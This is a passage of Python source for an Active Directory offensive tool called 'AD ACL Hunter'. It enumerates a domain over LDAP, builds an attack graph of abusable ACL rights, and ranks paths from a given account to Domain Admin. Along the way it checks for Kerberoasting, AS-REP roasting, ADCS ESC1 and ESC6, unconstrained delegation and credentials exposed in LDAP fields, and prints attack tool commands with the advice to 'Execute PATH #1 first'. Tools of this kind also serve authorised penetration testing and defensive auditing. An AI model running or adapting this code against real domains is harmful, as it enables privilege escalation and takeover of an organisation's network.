                                "sid": sid, "dn": mdn_str,
                                "is_enabled":  not bool(uac & UAC_DISABLED),
                                "has_preauth": not bool(uac & UAC_DONT_REQ_PREAUTH),
                                "spns":        spns,
                            }
                except Exception:
                    pass
        except Exception:
            pass

                                               
    da_target_dns.add(domain_dn.lower())

                   
    sdh_dn = f"CN=AdminSDHolder,CN=System,{domain_dn}"
    da_target_dns.add(sdh_dn.lower())

    return da_member_sids, da_target_dns, da_member_info


def _build_attack_graph(conn, domain_dn: str, priv_sids: set,
                        domain_sid: str, page_size: int = 500) -> dict:
    
    graph: dict = defaultdict(list)
    sd_ctrl = security_descriptor_control(sdflags=0x04)

    def is_legit(sid: str) -> bool:
        if sid in priv_sids:
            return True
        if sid in ("S-1-5-18","S-1-5-32-544","S-1-5-9","S-1-5-10","S-1-5-11"):
            return True
        if domain_sid and sid.startswith(domain_sid + "-"):
            if sid.split("-")[-1] in ("500","512","516","517","518","519","520","521"):
                return True
        return False

    print(f"  {Fore.CYAN}[*] PathToDA: Building domain-wide attack graph...{Style.RESET_ALL}")
    all_entries = paged_search_all(
        conn, domain_dn,
        search_filter="(objectClass=*)",
        attributes=["nTSecurityDescriptor","distinguishedName","objectClass",
                    "name","sAMAccountName","objectSid"],
        page_size=page_size,
        extra_controls=sd_ctrl,
    )
    total = len(all_entries)
    print(f"  {Fore.CYAN}[*] PathToDA: Scanning {total} objects for attack edges...{Style.RESET_ALL}")

    for i, entry in enumerate(all_entries):
        try:
            attrs      = entry.get("attributes", {})
            dn         = entry.get("dn", "")
            raw_sd_l   = entry.get("raw_attributes", {}).get("nTSecurityDescriptor", [])
            if not raw_sd_l:
                continue
            classes    = [c.lower() for c in listify(attrs.get("objectClass"))]
            sam_target = str(first_value(attrs.get("sAMAccountName")) or
                             dn.split(",")[0].replace("CN=","") if dn else "?")
            raw_sid    = entry.get("raw_attributes", {}).get("objectSid", [])
            target_sid = sid_to_str(raw_sid[0]) if raw_sid else ""
            obj_type   = ("group" if "group" in classes else
                          "computer" if "computer" in classes else
                          "user" if "user" in classes else
                          "ou" if "organizationalunit" in classes else
                          "gpo" if "grouppolicycontainer" in classes else
                          "domain" if "domain" in classes else "object")

            aces = parse_aces(raw_sd_l[0])
            for ace in aces:
                if ace["type"] not in (0x00, 0x05):
                    continue
                trustee = ace["trustee"]
                if is_legit(trustee):
                    continue
                rights = check_rights(ace["access_mask"], ace["guid"])
                if not rights:
                    continue
                graph[trustee].append({
                    "target_dn":   dn,
                    "target_sam":  sam_target,
                    "target_sid":  target_sid,
                    "target_type": obj_type,
                    "rights":      rights,
                    "inherited":   ace["inherited"],
                })
        except Exception:
            continue
        if i % 200 == 0 or i == total - 1:
            pct = int(((i + 1) / max(total, 1)) * 100)
            bar = "█" * (pct // 5) + "░" * (20 - pct // 5)
            print(f"\r  [{bar}] {pct}%  ({i+1}/{total})", end="", flush=True)
    print(f"\r  [{'█'*20}] 100%  ({total}/{total})  ")
    return dict(graph)


def _bfs_paths(graph: dict, start_sids: set, da_member_sids: set,
               da_target_dns: set, max_depth: int = 4) -> list:
    
    found_paths = []
                                                            
    queue    = deque()
                                                           
    visited  = set()

    for sid in start_sids:
        queue.append((sid, []))

    while queue:
        current_sid, path = queue.popleft()

        state_key = (current_sid, len(path))
        if state_key in visited:
            continue
        visited.add(state_key)

        if len(path) >= max_depth:
            continue

        for edge in graph.get(current_sid, []):
            target_dn  = edge.get("target_dn", "").lower()
            target_sid = edge.get("target_sid", "")
            rights     = edge.get("rights", [])

                                                             
            if target_sid in da_member_sids or target_dn in da_target_dns:
                full_path = path + [edge]
                found_paths.append(full_path)
                continue

                                                                                 
            has_compromise_right = any(r in FULL_COMPROMISE_RIGHTS for r in rights)
            if has_compromise_right and target_sid and target_sid not in {e.get("target_sid","") for e in path}:
                queue.append((target_sid, path + [edge]))

    return found_paths


def _score_path(path: list) -> float:
    
    if not path:
        return 9999.0
    hops       = len(path)
    rights_all = [r for edge in path for r in edge.get("rights", [])]
    diffs      = [EXPLOIT_DIFFICULTY.get(r, 3) for r in rights_all]
    if not diffs:
        diffs = [3]
    max_diff = max(diffs)
    avg_diff = sum(diffs) / len(diffs)
    return hops * 2.0 + max_diff + avg_diff * 0.5


def _confidence(path: list, path_type: str) -> float:
    
    if path_type in ("ADCS_ESC1","ADCS_ESC6","ADCS_ESC8"):
        return 0.90
    if path_type == "CredentialExposure":
        return 0.85
    if path_type == "ASREP":
        return 0.75                                
    if path_type == "Kerberoast":
        return 0.65                                
    if path_type == "UnconstrainedDelegation":
        return 0.80
                     
    hops = len(path)
    if hops == 1:
        return 0.98
    if hops == 2:
        return 0.92
    if hops == 3:
        return 0.82
    return 0.70


def _build_path_obj(path: list, conn, domain_dn: str, da_member_info: dict,
                    path_type: str = "ACL_CHAIN") -> AttackPath:
    
    steps = []
    for edge in path:
        rights = edge.get("rights", [])
                                                   
        priority_order = [
            "GenericAll","AddMember","ForceChangePassword","DS-Replication-Get-Changes-All",
            "ShadowCredentials","WriteDacl","WriteOwner","GenericWrite","WriteAllProperties",
            "WriteScriptPath","WriteUserAccountControl","WriteSPN","SetRBCD",
        ]
        best_right = rights[0]
        for r in priority_order:
            if r in rights:
                best_right = r
                break
        diff = EXPLOIT_DIFFICULTY.get(best_right, 3)
        tech = ATTACK_TECHNIQUES.get(best_right, {})
        steps.append(AttackStep(
            actor_sam    = "YOU",
            actor_sid    = "",
            target_sam   = edge.get("target_sam", "?"),
            target_dn    = edge.get("target_dn", ""),
            target_sid   = edge.get("target_sid", ""),
            target_type  = edge.get("target_type", "object"),
            right        = best_right,
            difficulty   = diff,
            technique    = tech.get("technique", best_right),
            tools        = TOOL_COMMANDS.get(best_right, []),
            extra_context= ("Inherited ACE" if edge.get("inherited") else ""),
        ))

    diffs = [s.difficulty for s in steps] or [3]
    confidence = _confidence(path, path_type)
                   
    chain = " → ".join(
        f"[{s.right}] on {s.target_sam}" for s in steps
    )

    return AttackPath(
        steps          = steps,
        total_hops     = len(steps),
        max_difficulty = max(diffs),
        avg_difficulty = sum(diffs) / len(diffs),
        confidence     = confidence,
        path_type      = path_type,
        summary        = chain,
        final_target   = steps[-1].target_sam if steps else "DA",
    )


def run_path_to_da(conn, domain_dn: str, attacker_sam: str,
                   page_size: int = 500) -> dict:
    
    result = {
        "attacker": attacker_sam,
        "paths":    [],
        "summary":  {},
    }

    domain_sid = _get_domain_sid_prefix(conn, domain_dn)

    priv_sids = set()
    if domain_sid:
        for rid in (500,512,516,517,518,519,520,521):
            priv_sids.add(f"{domain_sid}-{rid}")
    priv_sids.update({"S-1-5-18","S-1-5-32-544","S-1-5-9"})

                                                                             
    print(f"  {Fore.CYAN}[*] PathToDA: Resolving attacker '{attacker_sam}'...{Style.RESET_ALL}")
    try:
        attacker_obj = get_object_info(conn, domain_dn, attacker_sam)
    except SystemExit:
        result["error"] = f"Attacker account '{attacker_sam}' not found."
        return result

    attacker_sid = attacker_obj["sid"]
    controlled_sids: set[str] = {attacker_sid}

                                                                  
    print(f"  {Fore.CYAN}[*] PathToDA: Resolving group memberships...{Style.RESET_ALL}")
    groups_data = get_member_of(conn, domain_dn, attacker_sam)
    for grp in groups_data:
        try:
            conn.search(domain_dn, f"(sAMAccountName={grp['group']})",
                        SUBTREE, attributes=["objectSid"])
            if conn.entries:
                raw = conn.entries[0]["objectSid"].raw_values
                if raw:
                    controlled_sids.add(sid_to_str(raw[0]))
        except Exception:
            pass

                                     
    is_already_da = any(s == f"{domain_sid}-512" or s == f"{domain_sid}-519"
                        for s in controlled_sids) if domain_sid else False

    result["attacker_sid"]    = attacker_sid
    result["controlled_sids"] = list(controlled_sids)
    result["is_already_da"]   = is_already_da

    if is_already_da:
        result["paths"].append({
            "path_type": "ALREADY_DA",
            "hops": 0,
            "difficulty": 0,
            "confidence": 1.0,
            "summary": "Attacker is ALREADY a member of Domain Admins or Enterprise Admins.",
            "steps": [],
        })

                                                                            
    print(f"  {Fore.CYAN}[*] PathToDA: Enumerating Domain Admin targets...{Style.RESET_ALL}")
    da_member_sids, da_target_dns, da_member_info = _get_da_targets(
        conn, domain_dn, domain_sid)

                                                                             
    graph = _build_attack_graph(conn, domain_dn, priv_sids, domain_sid, page_size)

                                                                            
    print(f"  {Fore.CYAN}[*] PathToDA: BFS path analysis (max 4 hops)...{Style.RESET_ALL}")
    raw_paths = _bfs_paths(graph, controlled_sids, da_member_sids,
                           da_target_dns, max_depth=4)

                                             
    seen_summaries: set[str] = set()
    acl_paths: list[AttackPath] = []
    for rp in raw_paths:
        if not rp:
            continue
        ap = _build_path_obj(rp, conn, domain_dn, da_member_info, "ACL_CHAIN")
        key = ap.summary[:80]
        if key not in seen_summaries:
            seen_summaries.add(key)
            acl_paths.append(ap)

                   
    acl_paths.sort(key=lambda p: _score_path(
        [{"rights": [s.right]} for s in p.steps]))
    result["acl_paths"] = [vars(p) if hasattr(p,"__dict__") else p
                           for p in acl_paths[:15]]

                                                                            
    special_paths: list[dict] = []

                                   
    print(f"  {Fore.CYAN}[*] PathToDA: Checking Kerberoastable DA accounts...{Style.RESET_ALL}")
    for sam, info in da_member_info.items():
        if info.get("spns") and info.get("is_enabled"):
            special_paths.append({
                "path_type":  "Kerberoast",
                "hops":       1,
                "difficulty": EXPLOIT_DIFFICULTY["Kerberoast"],
                "confidence": _confidence([], "Kerberoast"),
                "target_sam": sam,
                "target_dn":  info["dn"],
                "spns":       info["spns"][:3],
                "summary": (
                    f"Domain Admin '{sam}' has SPNs and is Kerberoastable. "
                    "Request TGS → offline crack → DA credentials."
                ),
                "tools": TOOL_COMMANDS["Kerberoast"],
            })

                                    
    print(f"  {Fore.CYAN}[*] PathToDA: Checking ASREP-roastable DA accounts...{Style.RESET_ALL}")
    for sam, info in da_member_info.items():
        if not info.get("has_preauth") and info.get("is_enabled"):
            special_paths.append({
                "path_type":  "ASREP",
                "hops":       1,
                "difficulty": EXPLOIT_DIFFICULTY["ASREP"],
                "confidence": _confidence([], "ASREP"),
                "target_sam": sam,
                "target_dn":  info["dn"],
                "summary": (
                    f"Domain Admin '{sam}' has DONT_REQ_PREAUTH (ASREPRoastable). "
                    "No credentials required — get AS-REP hash → offline crack → DA."
                ),
                "tools": TOOL_COMMANDS["ASREP"],
            })

                             
    print(f"  {Fore.CYAN}[*] PathToDA: Checking ADCS certificate paths...{Style.RESET_ALL}")
    pki_base = f"CN=Public Key Services,CN=Services,CN=Configuration,{domain_dn}"
    sd_ctrl  = security_descriptor_control(sdflags=0x04)
          
    try:
        cas = paged_search_all(conn, pki_base,
            "(objectClass=pKIEnrollmentService)",
            ["cn","msPKI-Enrollment-Flag","dNSHostName"], page_size=50)
        for ca in cas:
            ca_a = ca.get("attributes",{})
            flags = int(first_value(ca_a.get("msPKI-Enrollment-Flag")) or 0)
            if flags & 0x40:
                ca_name = str(first_value(ca_a.get("cn")) or "?")
                ca_host = str(first_value(ca_a.get("dNSHostName")) or "?")
                special_paths.append({
                    "path_type":  "ADCS_ESC6",
                    "hops":       1,
                    "difficulty": EXPLOIT_DIFFICULTY["ADCS_ESC6"],
                    "confidence": _confidence([], "ADCS_ESC6"),
                    "ca_name":    ca_name,
                    "ca_server":  ca_host,
                    "summary": (
                        f"CA '{ca_name}' has EDITF_ATTRIBUTESUBJECTALTNAME2. "
                        "Request ANY template cert as Domain Admin → authenticate as DA."
                    ),
                    "tools": [
                        t.replace("{ca_name}", ca_name).replace("{ca_server}", ca_host)
                        for t in TOOL_COMMANDS["ADCS_ESC6"]
                    ],
                })
    except Exception:
        pass
          
    try:
        AUTH_EKUS = {"1.3.6.1.5.5.7.3.2","1.3.6.1.4.1.311.20.2.2",
                     "2.5.29.37.0","1.3.6.1.5.2.3.4"}
        ENROLL_GUID = "0e10c968-78fb-11d2-90d4-00c04f79dc55"
        LOW_PRIV    = {"S-1-1-0","S-1-5-11","S-1-5-7"}
        tmpls = paged_search_all(conn, pki_base,
            "(objectClass=pKICertificateTemplate)",
            ["cn","msPKI-Certificate-Name-Flag","msPKI-Enrollment-Flag",
             "msPKI-RA-Signature","pKIExtendedKeyUsage","nTSecurityDescriptor"],
            page_size=200, extra_controls=sd_ctrl)
        for t in tmpls:
            ta   = t.get("attributes",{})
            name_flag = int(first_value(ta.get("msPKI-Certificate-Name-Flag")) or 0)
            enr_flag  = int(first_value(ta.get("msPKI-Enrollment-Flag")) or 0)
            ra_sig    = int(first_value(ta.get("msPKI-RA-Signature")) or 0)
            ekus      = [str(e_) for e_ in listify(ta.get("pKIExtendedKeyUsage"))]
            tmpl_name = str(first_value(ta.get("cn")) or "?")
            if not (name_flag & 0x1):  continue
            if enr_flag & 0x2:         continue
            if ra_sig != 0:            continue
            if not (any(e_ in AUTH_EKUS for e_ in ekus) or not ekus): continue
            rsd = t.get("raw_attributes",{}).get("nTSecurityDescriptor",[])
            if not rsd: continue
            for ace in parse_aces(rsd[0]):
                if ace["type"] not in (0x00, 0x05): continue
                if ace["trustee"] not in LOW_PRIV:  continue
                guid_l = (ace["guid"] or "").lower()
                if not (ace["access_mask"] & 0x100 and
                        (not guid_l or guid_l == ENROLL_GUID)): continue
                trustee_name = resolve_sid_to_name(conn, domain_dn, ace["trustee"])
                special_paths.append({
                    "path_type":   "ADCS_ESC1",
                    "hops":        1,
                    "difficulty":  EXPLOIT_DIFFICULTY["ADCS_ESC1"],
                    "confidence":  _confidence([], "ADCS_ESC1"),
                    "template":    tmpl_name,
                    "enrollee":    trustee_name,
                    "summary": (
                        f"Template '{tmpl_name}' allows '{trustee_name}' to specify SAN. "
                        "Request cert with Domain Admin UPN → authenticate as DA."
                    ),
                    "tools": [
                        t2.replace("{template}", tmpl_name)
                        for t2 in TOOL_COMMANDS["ADCS_ESC1"]
                    ],
                })
                break
    except Exception:
        pass

                                            
    print(f"  {Fore.CYAN}[*] PathToDA: Checking DA credential exposure...{Style.RESET_ALL}")
    for sam, info in da_member_info.items():
        try:
            conn.search(info["dn"], "(objectClass=*)", BASE,
                attributes=_SENSITIVE_LDAP_FIELDS + ["userAccountControl"])
            if conn.entries:
                e_   = conn.entries[0]
                for field in _SENSITIVE_LDAP_FIELDS:
                    val = str(e_[field].value or "").strip() if e_[field].value else ""
                    if not val or len(val) < 8:
                        continue
                    for pat in _PWD_RE:
                        m = pat.search(val)
                        if m and len(m.group().strip()) >= 8:
                            special_paths.append({
                                "path_type": "CredentialExposure",
                                "hops":      1,
                                "difficulty": EXPLOIT_DIFFICULTY["CredentialExposure"],
                                "confidence": _confidence([], "CredentialExposure"),
                                "target_sam": sam,
                                "field":      field,
                                "value":      val[:80],
                                "match":      m.group()[:40],
                                "summary": (
                                    f"Domain Admin '{sam}' has possible credential in "
                                    f"LDAP field '{field}': '{val[:60]}'. "
                                    "Authenticate directly as DA."
                                ),
                                "tools": TOOL_COMMANDS["CredentialExposure"],
                            })
                            break
        except Exception:
            pass

                                                     
    print(f"  {Fore.CYAN}[*] PathToDA: Checking delegation attack vectors...{Style.RESET_ALL}")
    try:
        unc_entries = paged_search_all(
            conn, domain_dn,
            "((&(objectClass=computer)"
            "(userAccountControl:1.2.840.113556.1.4.803:=524288)"
            "(!(userAccountControl:1.2.840.113556.1.4.803:=8192))))",
            ["sAMAccountName","dNSHostName"], page_size=200)
        for eu in unc_entries:
            ea  = eu.get("attributes",{})
            cs  = str(first_value(ea.get("sAMAccountName")) or "?")
            dns = str(first_value(ea.get("dNSHostName")) or "?")
            special_paths.append({
                "path_type":  "UnconstrainedDelegation",
                "hops":       2,
                "difficulty": EXPLOIT_DIFFICULTY["UnconstrainedDelegation"],
                "confidence": _confidence([], "UnconstrainedDelegation"),
                "target_sam": cs,
                "target_dns": dns,
                "summary": (
                    f"Computer '{cs}' ({dns}) has Unconstrained Delegation. "
                    "If you can access this machine: coerce DC auth → capture TGT → DA."
                ),
                "tools": [t2.replace("{target_hostname}", dns)
                          for t2 in TOOL_COMMANDS["UnconstrainedDelegation"]],
            })
    except Exception:
        pass

    result["special_paths"] = special_paths

                                                                            
    all_scored: list[tuple[float,dict]] = []
    for ap in acl_paths[:15]:
        score = _score_path([{"rights": [s.right]} for s in ap.steps])
        hops  = ap.total_hops
        d     = {
            "path_type":   ap.path_type,
            "hops":        hops,
            "difficulty":  ap.max_difficulty,
            "avg_difficulty": round(ap.avg_difficulty, 1),
            "confidence":  round(ap.confidence * 100),
            "summary":     ap.summary,
            "steps":       [
                {
                    "target_sam":  s.target_sam,
                    "target_dn":   s.target_dn,
                    "target_type": s.target_type,
                    "right":       s.right,
                    "technique":   s.technique,
                    "difficulty":  s.difficulty,
                    "tools":       s.tools,
                    "inherited":   s.extra_context == "Inherited ACE",
                }
                for s in ap.steps
            ],
        }
        all_scored.append((score, d))

    for sp in special_paths:
        score = sp["hops"] * 2.0 + sp["difficulty"]
        all_scored.append((score, sp))

    all_scored.sort(key=lambda x: x[0])
    result["paths"] = [d for _, d in all_scored[:20]]

                   
    total_paths = len(result["paths"])
    min_hops    = min((p["hops"] for p in result["paths"]), default=0)
    result["summary"] = {
        "total_paths_found": total_paths,
        "shortest_path_hops": min_hops,
        "attacker": attacker_sam,
        "is_already_da": is_already_da,
    }
    return result


def print_path_to_da(data: dict) -> None:
    
    W = 72
    print(f"\n{'═'*W}")
    print(f"  SHORT PATH TO DOMAIN ADMIN  —  From: {data.get('attacker','?')}")
    print(f"{'═'*W}")

    if data.get("error"):
        print(f"\n  {Fore.RED}Error: {data['error']}{Style.RESET_ALL}")
        return

    summary = data.get("summary", {})
    is_da   = data.get("is_already_da", False)
    paths   = data.get("paths", [])

    if is_da:
        print(f"\n  {Fore.RED}[!] ALREADY A DOMAIN ADMIN — No further escalation needed.{Style.RESET_ALL}")
        print(f"  Attacker SID: {data.get('attacker_sid','?')}")
        return

    if not paths:
        print(f"\n  {Fore.GREEN}No attack paths to Domain Admin were found from this account.{Style.RESET_ALL}")
        print(f"  This may indicate limited access — try from a different starting account.")
        return

    total = summary.get("total_paths_found", len(paths))
    min_h = summary.get("shortest_path_hops", "?")
    print(f"\n  Paths found : {Fore.YELLOW}{total}{Style.RESET_ALL}")
    print(f"  Shortest    : {Fore.YELLOW}{min_h} hop(s){Style.RESET_ALL}")
    print(f"  Ranked by   : Fewest hops × Lowest difficulty × Highest confidence")
    print(f"\n  Showing top {min(len(paths), 10)} paths (best first):\n")

    SEV_COLORS = {1: Fore.RED, 2: Fore.YELLOW, 3: Fore.YELLOW,
                  4: Fore.WHITE, 5: Fore.WHITE}
    DIFF_LABELS = {1:"TRIVIAL", 2:"EASY", 3:"MEDIUM", 4:"HARD", 5:"COMPLEX"}
    PATH_TYPE_LABELS = {
        "ACL_CHAIN":            "ACL Chain",
        "Kerberoast":           "Kerberoasting",
        "ASREP":                "ASREP-Roasting",
        "ADCS_ESC1":            "ADCS ESC1 (Cert SAN)",
        "ADCS_ESC6":            "ADCS ESC6 (CA Flag)",
        "ADCS_ESC8":            "ADCS ESC8 (HTTP Relay)",
        "CredentialExposure":   "Credential in LDAP",
        "UnconstrainedDelegation":"Unconstrained Delegation",
        "ALREADY_DA":           "Already DA",
    }

    for i, path in enumerate(paths[:10], 1):
        ptype   = path.get("path_type", "ACL_CHAIN")
        hops    = path.get("hops", "?")
        diff    = path.get("difficulty", 3)
        conf    = path.get("confidence", 0)
        ptype_l = PATH_TYPE_LABELS.get(ptype, ptype)
        diff_l  = DIFF_LABELS.get(diff, str(diff))
        diff_col = SEV_COLORS.get(diff, Fore.WHITE)
        conf_col = Fore.GREEN if conf >= 85 else (Fore.YELLOW if conf >= 65 else Fore.WHITE)

        print(f"{'─'*W}")
        print(
            f"  PATH #{i}  "
            f"[{diff_col}{diff_l}{Style.RESET_ALL}]  "
            f"{hops} hop(s)  │  "
            f"Type: {ptype_l}  │  "
            f"Confidence: {conf_col}{conf}%{Style.RESET_ALL}"
        )
        print(f"{'─'*W}")

        steps = path.get("steps", [])
        if steps:
                               
            print(f"  YOU ({data.get('attacker','?')})")
            for step in steps:
                right_col = Fore.RED if step.get("difficulty",3) <= 2 else Fore.YELLOW
                inh_tag   = " [inherited]" if step.get("inherited") else ""
                print(f"    └─ {right_col}[{step['right']}]{Style.RESET_ALL}"
                      f"  on  '{step['target_sam']}'  [{step['target_type']}]{inh_tag}")
                print(f"       └─ {step['technique'][:80]}")
            print(f"    └─ {Fore.RED}>>> DOMAIN ADMIN <<<{Style.RESET_ALL}")
        else:
            print(f"  {path.get('summary','')[:120]}")

                                                                     
        if i <= 5 and steps:
            print(f"\n  Tools:")
            for step in steps:
                if step.get("tools"):
                    print(f"  [{step['right']}]:")
                    for cmd in step["tools"][:4]:
                        print(f"    {Fore.LIGHTBLACK_EX}{cmd[:120]}{Style.RESET_ALL}")
        elif i <= 5 and not steps:
                          
            tools = path.get("tools", [])
            if tools:
                print(f"\n  Tools:")
                for cmd in tools[:5]:
                    print(f"    {Fore.LIGHTBLACK_EX}{cmd[:120]}{Style.RESET_ALL}")
        print()

    print(f"{'═'*W}")
    print(f"  {Fore.RED}Total exploitable paths to Domain Admin: {len(paths)}{Style.RESET_ALL}")
    print(f"  Priority: Execute PATH #1 first (lowest hops × difficulty).")
    print(f"{'═'*W}\n")


                                                                                
       
                                                                                
def main():
    args      = get_args()
    domain_dn = ",".join(f"DC={p}" for p in args.domain.upper().split("."))

    now = datetime.now().astimezone()
    print(f"{Fore.CYAN}AD ACL Hunter{Style.RESET_ALL}")
    print(f"  {Fore.CYAN}Time      :{Style.RESET_ALL} {now.strftime('%Y-%m-%d %H:%M:%S %Z')}")
    print(f"  {Fore.CYAN}User      :{Style.RESET_ALL} {args.username}")
    print(f"  {Fore.CYAN}Domain    :{Style.RESET_ALL} {args.domain}")
    print(f"  {Fore.CYAN}DC IP     :{Style.RESET_ALL} {args.dc_ip}")
    print(f"  {Fore.CYAN}Base DN   :{Style.RESET_ALL} {domain_dn}")

    print(f"\n{Fore.CYAN}[*] Connecting...{Style.RESET_ALL}")
    try:
        conn = ldap_connect(args.dc_ip, args.domain, args.username, args.password)
        print(f"{Fore.GREEN}[+] Connection established{Style.RESET_ALL}")
    except Exception as e:
        print(f"{Fore.RED}[-] Connection failed: {e}{Style.RESET_ALL}")
        sys.exit(1)

    output_data   = {}
    any_mode_used = False

    if args.list_members:
        any_mode_used = True
        print(f"\n{Fore.CYAN}[*] Fetching members of '{args.list_members}'...{Style.RESET_ALL}")
        members = get_group_members(conn, domain_dn, args.list_members)
        print_group_members(args.list_members, members)
        output_data["list_members"] = members

    if args.member_of:
        any_mode_used = True
        print(f"\n{Fore.CYAN}[*] Resolving memberships for '{args.member_of}'...{Style.RESET_ALL}")
        groups = get_member_of(conn, domain_dn, args.member_of)
        print_member_of(args.member_of, groups)
        output_data["member_of"] = groups

    if args.is_nested:
        any_mode_used = True
        print(f"\n{Fore.CYAN}[*] Checking nesting for '{args.is_nested}'...{Style.RESET_ALL}")
        parents = check_is_nested(conn, domain_dn, args.is_nested)
        print_is_nested(args.is_nested, parents)
        output_data["is_nested"] = parents

    if args.priv_access:
        any_mode_used = True
        print(f"\n{Fore.CYAN}[*] Enumerating Privileged Access...{Style.RESET_ALL}")
        pa_data = enum_privileged_access(conn, domain_dn)
        print_priv_access(pa_data)
        output_data["priv_access"] = pa_data

    if args.admin_sdholder:
        any_mode_used = True
        target_sid = None
        if args.target:
            obj = get_object_info(conn, domain_dn, args.target)
            target_sid = obj["sid"]
            print(f"{Fore.GREEN}[+] Filtering AdminSDHolder for SID: {target_sid}{Style.RESET_ALL}")
        sdh_data = check_admin_sdholder(conn, domain_dn, target_sid=target_sid)
        print_admin_sdholder(sdh_data)
        output_data["admin_sdholder"] = sdh_data

    if args.domain_recon:
        any_mode_used = True
        print(f"\n{Fore.CYAN}[*] Running full domain recon...{Style.RESET_ALL}")
        recon_data = run_domain_recon(conn, domain_dn)
        print_domain_recon(recon_data)
        output_data["domain_recon"] = recon_data

    if args.trust_enum:
        any_mode_used = True
        print(f"\n{Fore.CYAN}[*] Enumerating domain trusts...{Style.RESET_ALL}")
        trusts = get_domain_trusts(conn, domain_dn)
        print_trust_enum(trusts, args.domain)
        output_data["trust_enum"] = trusts

    if args.trust_deep:
        any_mode_used = True
        print(f"\n{Fore.CYAN}[*] Running deep trust analysis...{Style.RESET_ALL}")
        trusts     = get_domain_trusts(conn, domain_dn)
        cross_enum = {}
        for t in trusts:
            tname = t["name"]
            if t["direction_raw"] in (2, 3):
                print(f"  {Fore.CYAN}[*] Cross-domain enum → {tname}...{Style.RESET_ALL}")
                cross_enum[tname] = enumerate_trusted_domain_objects(conn, tname)
                status = (f"{Fore.GREEN}accessible{Style.RESET_ALL}"
                          if cross_enum[tname]["accessible"]
                          else f"{Fore.YELLOW}not accessible{Style.RESET_ALL}")
                print(f"      {status}")
            else:
                cross_enum[tname] = {
                    "accessible": False,
                    "error":      "Inbound-only trust — no outbound auth possible",
                    "users": [], "spn_accounts": [], "admins": [], "computers": [],
                }
        print_trust_deep(trusts, args.domain, cross_enum)
        output_data["trust_deep"] = {"trusts": trusts, "cross_enum": cross_enum}

    if args.needle:
        any_mode_used = True
        print(f"\n{Fore.CYAN}[*] Running Needle scan...{Style.RESET_ALL}")
        needle_data = run_needle_scan(conn, domain_dn, page_size=args.page_size)
        print_needle_results(needle_data)
        output_data["needle"] = needle_data

    if args.target or not any_mode_used:
        target_name = args.target or args.username
        print(f"\n{Fore.CYAN}[*] Resolving '{target_name}'...{Style.RESET_ALL}")
        obj = get_object_info(conn, domain_dn, target_name)
        print(f"{Fore.GREEN}[+] SID  : {obj['sid']}{Style.RESET_ALL}")
        print(f"{Fore.GREEN}[+] DN   : {obj['dn']}{Style.RESET_ALL}")
        print(f"{Fore.GREEN}[+] Type : {'Group' if obj['is_group'] else 'User'}{Style.RESET_ALL}")
        results  = hunt_acls(
            conn, domain_dn, obj["sid"],
            include_all=args.all_rights,
            skip_inherited=args.no_inherited,
            page_size=args.page_size,
        )
        obj_type = "group" if obj["is_group"] else "user"
        print_acl_results(target_name, results, target_type=obj_type)
        output_data["acls"] = results
        if args.with_members:
            if not obj["is_group"]:
                print(f"{Fore.YELLOW}[!] --with-members ignored: '{target_name}' is not a group.{Style.RESET_ALL}")
            else:
                members = get_group_members(conn, domain_dn, target_name)
                print_group_members(target_name, members)
                output_data["group_members"] = members

    if args.output and output_data:
        with open(args.output, "w", encoding="utf-8") as f:
            json.dump(output_data, f, indent=2, ensure_ascii=False, default=str)
        print(f"{Fore.GREEN}[+] Results saved → {args.output}{Style.RESET_ALL}")

    conn.unbind()


if __name__ == "__main__":
    main()
